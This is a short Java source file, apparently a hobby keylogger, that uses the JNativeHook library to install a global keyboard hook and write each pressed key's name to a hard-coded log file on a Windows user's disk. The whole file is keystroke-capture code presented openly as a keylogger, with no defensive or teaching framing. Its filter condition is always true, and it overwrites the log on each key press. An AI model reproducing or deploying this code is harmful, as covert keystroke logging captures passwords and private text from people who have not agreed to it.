package keylogger;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class MainKey implements NativeKeyListener {
	private String aux = "";
	private log keylog = new log();

	public static void main(String[] args) {
		
			try {
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException e) {
			
				e.printStackTrace();
			}
				GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
		
}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		aux = NativeKeyEvent.getKeyText(e.getKeyCode());
		if (!aux.equals("Intro") || !aux.equals("Retroceso") || !aux.equals("Suprimir")){			
//System.out.print(aux);
			keylog.escribir(aux);
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		
		
	}

	

}
class log{
	
	private BufferedWriter log;
	
	public void escribir(String s){
		
		try {
			log = new BufferedWriter(new FileWriter("C:/Users/EA6259/Documents/juan/log.txt"));
			log.write(s);
			log.close();
		} catch (IOException e) {
			
			e.printStackTrace();
		}
		
		
	}
	
}